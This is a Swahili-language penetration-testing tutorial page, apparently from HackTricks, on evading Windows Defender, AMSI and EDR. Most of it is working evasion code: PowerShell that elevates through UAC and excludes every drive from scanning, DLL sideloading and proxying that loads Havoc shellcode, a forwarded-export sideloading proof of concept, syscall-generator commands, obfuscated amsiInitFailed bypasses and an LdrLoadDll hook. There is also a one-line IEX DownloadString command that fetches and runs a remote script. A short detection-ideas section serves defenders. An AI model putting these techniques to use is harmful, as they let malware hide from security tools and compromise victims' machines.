# Kukwepa Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Simamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Zana ya kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Zana ya kusimamisha Windows Defender kufanya kazi kwa kujifanya AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Mtego wa UAC wa mtindo wa kisakinishi kabla ya kuingilia Defender

Loaders za umma zinazojifanya cheats za michezo mara nyingi husambazwa kama installers za Node.js/Nexe zisizosainiwa, ambazo kwanza **humwomba mtumiaji ruhusa za juu** na kisha tu kuzima Defender. Mchakato wake ni rahisi:

1. Chunguza kama kuna muktadha wa kiutawala kwa kutumia `net session`. Amri hii hufaulu tu wakati mtumiaji anayeiendesha ana haki za admin, kwa hivyo ikishindwa inaonyesha kuwa loader inaendeshwa na mtumiaji wa kawaida.
2. Iwashe tena mara moja kwa kutumia verb ya `RunAs` ili kuonyesha kidokezo cha kawaida cha idhini ya UAC huku ukihifadhi mstari wa amri wa awali.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Waathiriwa tayari wanaamini kuwa wanasakinisha programu “cracked”, kwa hivyo kwa kawaida hukubali ombi hilo, na hivyo kuipa malware haki inazohitaji kubadilisha sera ya Defender.<sup>[[26]](#references)</sup>

### Exclusions za `MpPreference` za jumla kwa kila herufi ya kiendeshi

Baada ya kupata ruhusa za juu, minyororo ya aina ya GachiLoader huongeza maeneo yasiyoonekana na Defender badala ya kuzima huduma kabisa. Kwanza, loader huua GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) kisha huongeza **exclusions pana mno** ili kila wasifu wa mtumiaji, saraka ya mfumo na diski inayoweza kutolewa isiweze kuchanganuliwa:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Uchunguzi muhimu:

- Mzunguko hupitia kila filesystem iliyowekwa (D:\, E:\, vijiti vya USB, n.k.), kwa hivyo **payload yoyote itakayowekwa baadaye popote kwenye diski itapuuzwa**.
- Kutenga kiendelezi cha `.sys` ni hatua ya mbele—washambuliaji wanahifadhi chaguo la kupakia drivers zisizosainiwa baadaye bila kugusa Defender tena.
- Mabadiliko yote huwekwa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo hatua za baadaye zinaweza kuthibitisha kuwa exclusions zimehifadhiwa au kuziongeza bila kuanzisha UAC tena.

Kwa kuwa hakuna huduma ya Defender inayozimwa, ukaguzi wa kawaida wa afya ya mfumo huendelea kuripoti “antivirus active” ingawa ukaguzi wa wakati halisi haukagui kabisa njia hizo.<sup>[[26]](#references)</sup>

## **Mbinu za Kukwepa AV**

Kwa sasa, AV hutumia mbinu tofauti kuangalia kama faili ni hasidi au la: ugunduzi tuli, uchanganuzi wa dynamic, na kwa EDR za kisasa zaidi, uchanganuzi wa tabia.

### **Ugunduzi tuli**

Ugunduzi tuli hufanyika kwa kuweka alama kwenye strings au arrays of bytes hasidi zinazojulikana ndani ya binary au script, na pia kutoa taarifa kutoka kwenye faili lenyewe (k.m. maelezo ya faili, jina la kampuni, sahihi za kidijitali, ikoni, checksum, n.k.). Hii inamaanisha kuwa kutumia tools za umma zinazojulikana kunaweza kufanya ugunduliwe kwa urahisi zaidi, kwa kuwa huenda tayari zimechanganuliwa na kuwekwa alama kuwa hasidi. Kuna njia kadhaa za kukwepa aina hii ya ugunduzi:

- **Usimbaji fiche**

Ukisimba binary kwa fiche, AV haitaweza kugundua programu yako, lakini utahitaji aina fulani ya loader ili kusimbua na kuendesha programu kwenye memory.

- **Obfuscation**

Wakati mwingine unachohitaji ni kubadilisha baadhi ya strings ndani ya binary au script yako ili ipite AV, lakini hili linaweza kuchukua muda, kutegemea unachojaribu kuficha.

- **Kutengeneza tools maalum**

Ukitengeneza tools zako mwenyewe, hakutakuwa na signatures mbaya zinazojulikana, lakini hili huchukua muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kujaribu dhidi ya ugunduzi tuli wa Windows Defender ni kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi hugawanya faili katika sehemu nyingi kisha huiagiza Defender ichanganue kila sehemu kivyake. Hivyo, inaweza kukuambia hasa ni strings au bytes zipi ndani ya binary yako zilizowekwa alama.

Ninapendekeza sana uangalie [orodha hii ya video za YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu mbinu za vitendo za kukwepa AV.

### **Uchanganuzi wa dynamic**

Uchanganuzi wa dynamic ni pale AV inapoendesha binary yako ndani ya sandbox na kufuatilia shughuli hasidi (k.m. kujaribu kusimbua na kusoma nywila za browser yako, kufanya minidump ya LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kushughulikia, lakini haya ni baadhi ya mambo unayoweza kufanya ili kukwepa sandboxes.

- **Kusubiri kabla ya utekelezaji** Kulingana na jinsi inavyotekelezwa, hii inaweza kuwa njia nzuri ya kukwepa uchanganuzi wa dynamic wa AV. AV huwa na muda mfupi sana wa kuchanganua faili ili isikatize kazi ya mtumiaji, kwa hivyo kusubiri kwa muda mrefu kunaweza kuvuruga uchanganuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kuruka muda huo wa kusubiri, kutegemea jinsi ulivyotekelezwa.
- **Kukagua rasilimali za mashine** Kwa kawaida Sandboxes huwa na rasilimali chache sana (k.m. < 2GB RAM), vinginevyo zinaweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kutumia ubunifu hapa, kwa mfano kukagua halijoto ya CPU au hata kasi ya feni, kwa kuwa si kila kitu kitatekelezwa kwenye sandbox.
- **Ukaguzi maalum wa mashine** Ukitaka kulenga mtumiaji ambaye workstation yake imejiunga na domain ya "contoso.local", unaweza kukagua domain ya kompyuta kuona kama inalingana na uliyobainisha. Isipolingana, unaweza kufanya programu yako ijizime.

Imebainika kuwa computername ya Microsoft Defender's Sandbox ni HAL9TH. Kwa hivyo, unaweza kuangalia jina la kompyuta kwenye malware yako kabla haijatekelezwa. Likilingana na HAL9TH, inamaanisha uko ndani ya defender's sandbox, kwa hiyo unaweza kufanya programu yako ijizime.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kuhusu kukwepa Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> chaneli ya #malware-dev</p></figcaption></figure>

Kama tulivyosema awali kwenye chapisho hili, **tools za umma** hatimaye **hugunduliwa**, kwa hiyo jiulize jambo hili:

Kwa mfano, ukitaka kufanya dump ya LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia mradi mwingine usiojulikana sana ambao pia hufanya dump ya LSASS?

Huenda jibu sahihi ni chaguo la pili. Tukichukulia mimikatz kama mfano, huenda ni mojawapo ya vipande vya malware vilivyowekwa alama zaidi na AV na EDR, au pengine ndicho kilicho na alama nyingi zaidi. Ingawa mradi wenyewe ni mzuri sana, pia ni ndoto kujaribu kuutumia kukwepa AV, kwa hiyo tafuta tu njia mbadala za kufanikisha unachojaribu kufanya.

> [!TIP]
> Unaporekebisha payloads zako ili kukwepa ugunduzi, hakikisha **umezima uwasilishaji wa sampuli kiotomatiki** kwenye Defender, na tafadhali, kwa dhati, **USIPAKIE KWENYE VIRUSTOTAL** ikiwa lengo lako ni kukwepa ugunduzi kwa muda mrefu. Ukitaka kuangalia kama payload yako inagunduliwa na AV fulani, isakinishe kwenye VM, jaribu kuzima uwasilishaji wa sampuli kiotomatiki, kisha ijaribu humo hadi uridhike na matokeo.

## EXEs dhidi ya DLLs

Inapowezekana, **ipa kipaumbele kutumia DLLs ili kukwepa ugunduzi**. Kulingana na uzoefu wangu, faili za DLL kwa kawaida **hugunduliwa na kuchanganuliwa kwa kiwango cha chini zaidi**, kwa hiyo hii ni mbinu rahisi sana ya kuepuka ugunduzi katika baadhi ya hali (ikiwa payload yako inaweza kuendeshwa kama DLL, bila shaka).

Kama tunavyoona kwenye picha hii, Payload ya DLL kutoka Havoc ina kiwango cha ugunduzi cha 4/26 kwenye antiscan.me, huku payload ya EXE ikiwa na kiwango cha ugunduzi cha 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>ulinganisho wa antiscan.me kati ya payload ya kawaida ya Havoc EXE na Havoc DLL ya kawaida</p></figcaption></figure>

Sasa tutaonyesha mbinu kadhaa unazoweza kutumia na faili za DLL ili kujificha zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia mpangilio wa utafutaji wa DLL unaotumiwa na loader kwa kuweka programu lengwa na payload(s) hasidi pamoja.

Unaweza kutafuta programu zinazoweza kuathiriwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na script ifuatayo ya powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Amri hii itaonyesha orodha ya programu zilizo hatarini kwa DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **uchunguze mwenyewe programu zinazoweza kufanyiwa DLL Hijack/Sideload**, kwa kuwa mbinu hii inaweza kuwa fiche sana ikitekelezwa vizuri. Hata hivyo, ukitumia programu zinazojulikana hadharani zinazoweza kufanyiwa DLL Sideload, unaweza kugundulika kwa urahisi.

Kuweka tu DLL hasidi yenye jina ambalo programu inatarajia kupakia hakutapakia payload yako, kwa kuwa programu inatarajia functions mahususi ndani ya DLL hiyo. Ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** huelekeza calls zinazofanywa na programu kutoka kwa proxy DLL (hasidi) kwenda kwa DLL asilia. Hivyo, utendakazi wa programu huhifadhiwa na payload yako inaweza kutekelezwa.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Amri ya mwisho itatupatia faili 2: kiolezo cha msimbo chanzo wa DLL na DLL asilia iliyopewa jina jipya.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Hizi ndizo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyo-encode kwa [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina kiwango cha Detection cha 0/26 kwenye [antiscan.me](https://antiscan.me)! Naweza kusema kwamba huo ni mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninakupendekezea sana** utazame [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu yale tuliyojadili kwa undani zaidi.

### Kutumia Vibaya Forwarded Exports (ForwardSideLoading)

Moduli za Windows PE zinaweza ku-export functions ambazo kwa hakika ni "forwarders": badala ya kuelekeza kwenye code, ingizo la export huwa na mfuatano wa ASCII wa umbo la `TargetDll.TargetFunc`. Caller inapotafuta export hiyo, Windows loader itafanya yafuatayo:

- Itapakia `TargetDll` ikiwa bado haijapakiwa
- Itatafuta `TargetFunc` ndani yake

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwenye namespace ya KnownDLLs iliyolindwa (kwa mfano, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ikiwa `TargetDll` si KnownDLL, utaratibu wa kawaida wa kutafuta DLL hutumika, unaojumuisha directory ya moduli inayofanya forward resolution.

Hii huwezesha primitive ya indirect sideloading: tafuta DLL iliyosainiwa inayo-export function iliyo-forwardiwa kwenye jina la moduli isiyo KnownDLL, kisha iweke DLL hiyo iliyosainiwa pamoja na DLL inayodhibitiwa na mshambulizi, iliyopewa jina linalofanana kabisa na jina la moduli lengwa lililo-forwardiwa. Forwarded export inapoombwa, loader hutatua forward hiyo na kupakia DLL yako kutoka directory hiyo hiyo, na kutekeleza DllMain yako.<sup>[[13]](#references)</sup>

Mfano ulioonekana kwenye Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` si KnownDLL, kwa hivyo hutafutwa kwa kutumia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliyosainiwa kwenye folda inayoweza kuandikika.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi kwenye folda hiyo hiyo. `DllMain` ya msingi inatosha kupata code execution; huhitaji kutekeleza function inayopitishwa ili kuanzisha `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Anzisha forward kwa kutumia LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Tabia iliyozingatiwa:
- rundll32 (signed) hupakia `keyiso.dll` (signed) ya side-by-side
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader hufuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" baada tu ya `DllMain` kuwa tayari imeendeshwa

Vidokezo vya hunting:
- Lenga exports zilizo-forward ambapo module lengwa si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha exports zilizo-forward kwa kutumia zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama orodha ya Windows 11 forwarder ili kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Mawazo ya ugunduzi/ulinzi:
- Fuatilia LOLBins (kwa mfano, rundll32.exe) zinapopakia DLLs zilizotiwa saini kutoka kwenye njia zisizo za mfumo, kisha kupakia non-KnownDLLs zenye jina sawa la msingi kutoka kwenye saraka hiyo
- Toa arifa kuhusu minyororo ya michakato/moduli kama hii: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` katika njia ambazo watumiaji wanaweza kuandikia
- Tekeleza sera za uadilifu wa msimbo (WDAC/AppLocker) na ukatae ruhusa za kuandika na kutekeleza katika saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni zana ya payload ya kukwepa EDRs kwa kutumia michakato iliyosimamishwa, direct syscalls, na mbinu mbadala za utekelezaji`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu; kinachofanya kazi leo kinaweza kugunduliwa kesho. Kwa hivyo, usitegemee zana moja tu; ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls na Utatuzi wa SSN (SysWhispers4)

EDR mara nyingi huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kukwepa hooks hizo, unaweza kutengeneza syscall stubs za **direct** au **indirect** zinazopakia **SSN** sahihi (System Service Number) na kuingia kernel mode bila kutekeleza entrypoint ya export iliyo na hook.<sup>[[32]](#references)</sup>

**Chaguo za kuita:**
- **Direct (embedded)**: weka maagizo ya `syscall`/`sysenter`/`SVC #0` kwenye stub iliyotengenezwa (bila kugusa export ya `ntdll`).
- **Indirect**: ruka hadi kwenye gadget ya `syscall` iliyopo ndani ya `ntdll` ili mpito wa kernel uonekane kuwa umetoka `ntdll` (husaidia kukwepa heuristic); **randomized indirect** huchagua gadget kutoka kwenye pool kwa kila mwito.
- **Egg-hunt**: epuka kuweka mfuatano tuli wa opcode `0F 05` kwenye diski; tafuta mfuatano wa syscall wakati wa utekelezaji.

**Mikakati ya utatuzi wa SSN inayostahimili hooks:**
- **FreshyCalls (VA sort)**: kadiria SSN kwa kupanga syscall stubs kulingana na anwani zao za virtual badala ya kusoma bytes za stub.
- **SyscallsFromDisk**: mapisha `\KnownDlls\ntdll.dll` safi, soma SSN kutoka kwenye `.text` yake, kisha iondoe kwenye ramani (hii hukwepa hooks zote zilizo kwenye kumbukumbu).
- **RecycledGate**: changanya ukadiriaji wa SSN kwa kupanga VA na uthibitishaji wa opcode wakati stub iko safi; tumia ukadiriaji wa VA iwapo ina hook.
- **HW Breakpoint**: weka DR0 kwenye maagizo ya `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati wa utekelezaji, bila kuchanganua bytes zenye hook.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Hapo awali, AVs ziliweza kuchanganua **faili zilizo kwenye diski** pekee. Kwa hiyo, kama ungeweza kutekeleza payloads **moja kwa moja kwenye memory**, AV isingeweza kuzuia hilo kwa sababu haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeunganishwa katika vipengele hivi vya Windows.

- User Account Control, au UAC (kuinua ruhusa za EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi shirikishi, na tathmini ya msimbo unaozalishwa kwa nguvu)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Macros za Office VBA

Kinaruhusu suluhisho za antivirus kukagua tabia ya script kwa kuweka maudhui ya script wazi bila usimbaji fiche wala obfuscation.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha tahadhari ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoweka `amsi:` mwanzoni, ikifuatiwa na njia ya executable ambayo script ilitekelezwa kutoka kwake; katika hali hii, powershell.exe

Hatukuandika faili yoyote kwenye diski, lakini bado tulinaswa ikiwa kwenye memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, msimbo wa C# pia hupitishwa kupitia AMSI. Hili huathiri hata `Assembly.Load(byte[])` inayotumika kupakia utekelezaji kwenye memory. Ndiyo maana kutumia matoleo ya chini ya .NET (kama 4.7.2 au ya chini) kunapendekezwa kwa utekelezaji kwenye memory ikiwa unataka kukwepa AMSI.

Kuna njia kadhaa za kukwepa AMSI:

- **Obfuscation**

Kwa kuwa AMSI hufanya kazi hasa kwa kutumia utambuzi tuli, kurekebisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya kukwepa utambuzi.

Hata hivyo, AMSI inaweza kuondoa obfuscation kwenye scripts hata ikiwa ina tabaka nyingi, kwa hiyo obfuscation inaweza isiwe chaguo zuri kutegemea jinsi inavyofanywa. Hivyo, kuikwepa si jambo rahisi moja kwa moja. Lakini wakati mwingine, unachohitaji kufanya ni kubadilisha majina machache ya vigezo na utakuwa sawa; kwa hiyo inategemea kiwango ambacho kitu kimewekewa alama.

- **AMSI Bypass**

Kwa kuwa AMSI hutekelezwa kwa kupakia DLL ndani ya mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuichezea kwa urahisi hata ukiwa mtumiaji asiye na ruhusa za juu. Kwa sababu ya dosari hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kukwepa uchanganuzi wa AMSI.

**Kulazimisha Hitilafu**

Kulazimisha uanzishaji wa AMSI ushindwe (amsiInitFailed) kutasababisha uchanganuzi usianzishwe kwa mchakato wa sasa. Jambo hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imeunda signature ili kuzuia matumizi mapana zaidi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Kilichohitajika tu ni mstari mmoja wa msimbo wa PowerShell ili kufanya AMSI isiweze kutumika katika mchakato wa sasa wa PowerShell. Bila shaka, mstari huu umeripotiwa na AMSI yenyewe, kwa hivyo unahitaji kufanyiwa marekebisho ili kutumia mbinu hii.

Huu hapa ni AMSI bypass iliyorekebishwa niliyochukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Kumbuka kwamba huenda hii ikawekewa alama chapisho hili litakapotolewa, kwa hiyo hupaswi kuchapisha code ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta address ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuchanganua ingizo lililotolewa na mtumiaji) na kuibadilisha kwa maagizo ya kurudisha code ya E_INVALIDARG. Kwa njia hii, matokeo ya uchanganuzi halisi yatakuwa 0, ambayo huchukuliwa kuwa matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina zaidi.

Pia kuna mbinu nyingine nyingi zinazotumika kufanya bypass ya AMSI kwa kutumia powershell. Tembelea [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Kuzuia AMSI kwa kuzuia amsi.dll kupakiwa (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa kwenye process ya sasa. Mbinu imara ya bypass isiyotegemea lugha ni kuweka user-mode hook kwenye `ntdll!LdrLoadDll` ambayo hurudisha hitilafu wakati module inayoombwa ni `amsi.dll`. Matokeo yake, AMSI haipakizwi kamwe na hakuna scans zinazofanyika kwenye process hiyo.<sup>[[23]](#references)</sup>

Muhtasari wa utekelezaji (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Maelezo
- Hufanya kazi katika PowerShell, WScript/CScript na custom loaders (chochote ambacho kingepakia AMSI).
- Iunganishe na kuingiza scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka mabaki marefu kwenye command line.
- Imeonekana ikitumiwa na loaders zinazoendeshwa kupitia LOLBins (kwa mfano, `regsvr32` ikiita `DllRegisterServer`).

Zana **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia huzalisha script ya kubypass AMSI.
Zana **[https://amsibypass.com/](https://amsibypass.com/)** pia huzalisha script ya kubypass AMSI ambayo huepuka signature kwa kutumia user-defined function zilizowekwa kwa nasibu, variables, character expressions, na kutumia herufi kubwa na ndogo kwa nasibu kwenye keywords za PowerShell ili kuepuka signature.

**Ondoa saini iliyogunduliwa**

Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa saini ya AMSI kutoka kwenye memory ya process ya sasa. Zana hii hufanya kazi kwa kuchanganua memory ya process ya sasa ili kutafuta saini ya AMSI, kisha kuifuta kwa kuandika maagizo ya NOP juu yake, na hivyo kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI kwenye **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell version 2**
Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kusaidia kwa madhumuni ya ukaguzi na utatuzi wa matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kukwepa kugunduliwa**.

Ili kukwepa PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Zima PowerShell Transcription na Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Tumia PowerShell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Tumia kikao cha PowerShell kisichodhibitiwa**: Tumia [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kupangisha PowerShell bila kuanzisha `powershell.exe` (mbinu inayotumiwa na `powerpick` ya Cobalt Strike). Hii hukwepa vidhibiti vinavyohusishwa mahususi na mchakato wa `powershell.exe`, lakini haizimi moja kwa moja AMSI, Script Block Logging, au ulinzi mwingine wote wa PowerShell; kiwango cha ulinzi hutegemea runtime na utekelezaji wa host.


## Obfuscation

> [!TIP]
